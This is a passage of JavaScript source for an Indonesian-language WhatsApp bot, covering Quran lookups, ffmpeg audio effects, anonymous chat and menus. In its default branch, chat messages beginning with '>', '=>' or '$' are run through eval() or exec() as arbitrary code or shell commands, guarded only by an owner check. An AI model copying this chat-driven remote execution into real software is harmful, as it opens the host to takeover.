		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		kiki.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await kiki.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                kiki.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                kiki.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                kiki.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case 'anonymous': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                kiki.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await kiki.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, kiki.user.name, m)
            }
			break
            case 'keluar': case 'leave': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await kiki.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await kiki.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await kiki.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, kiki.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await kiki.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, kiki.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await kiki.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, kiki.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await kiki.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, kiki.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await kiki.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await kiki.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await kiki.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, kiki.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await kiki.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, kiki.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await kiki.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, kiki.user.name, m)
                }
                break
            }
            case 'public': {
                if (!isCreator) throw mess.owner
                kiki.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                kiki.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break
            case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break 
            case 'asalamualikum':
            m.reply(`walaikumsalam`)
            break 
            case 'bayejelek':
            m.reply(`hahaha awoakak parah lu`) 
            break
            case 'owner': case 'kiki': {
                kiki.sendContact(m.chat, global.owner, m)
            }
            break
case 'menu':
await kiki.send5ButImg(from, `` + '' + lang.menu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "list menu","id": 'command'}},{"quickReplyButton": {"displayText": "allmenu","id": 'allmenu'}}] )
break
case 'allmenu':
await kiki.send5ButImg(from, `` + '' + lang.allmenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Owner","id": 'owner'}}] )
break
case 'groupmenu':
await kiki.send5ButImg(from, `` + '' + lang.groupmenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'downloadermenu':
await kiki.send5ButImg(from, `` + '' + lang.downloadermenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'searchmenu':
await kiki.send5ButImg(from, `` + '' + lang.searchmenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'randommenu':
await kiki.send5ButImg(from, `` + '' + lang.randommenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'searchmenu':
await kiki.send5ButImg(from, `` + '' + lang.searchmenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'textpromenu':
await kiki.send5ButImg(from, `` + '' + lang.textpromenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'photooxymenu':
await kiki.send5ButImg(from, `` + '' + lang.photooxymenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'ephotomenu':
await kiki.send5ButImg(from, `` + '' + lang.ephotomenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'stickereffectmenu':
await kiki.send5ButImg(from, `` + '' + lang.stickereffectmenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'funmenu':
await kiki.send5ButImg(from, `` + '' + lang.funmenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'primbonmenu':
await kiki.send5ButImg(from, `` + '' + lang.primbonmenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'convertmenu':
await kiki.send5ButImg(from, `` + '' + lang.convertmenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'mainmenu':
await kiki.send5ButImg(from, `` + '' + lang.mainmenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'databasemenu':
await kiki.send5ButImg(from, `` + '' + lang.groupmenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'anonymousmenu':
await kiki.send5ButImg(from, `` + '' + lang.anonymousmenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'islamicmenu':
await kiki.send5ButImg(from, `` + '' + lang.islamicmenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'voicechargermenu':
await kiki.send5ButImg(from, `` + '' + lang.voicechargermenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'ownermenu':
await kiki.send5ButImg(from, `` + '' + lang.ownermenu(prefix), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'sewabot':
await kiki.send5ButImg(from, `` + '' + lang.sewabot(), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'thanksto':
await kiki.send5ButImg(from, `` + '' + lang.thanksto(), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "YouTube Cerator","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'donasi': case 'buypremium': case 'donate': {
                kiki.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/d902313cf651f7013f97f.jpg' }, caption: `Hai Kak ${m.pushName}seberapa donasi kamu akan saya tanggung terimakasih 🙏🏻` }) 
    }
	break
    case 'grupowner':
m.reply(`https://chat.whatsapp.com/JOxS05d1WWO529F40SEVEa`)
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    kiki.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
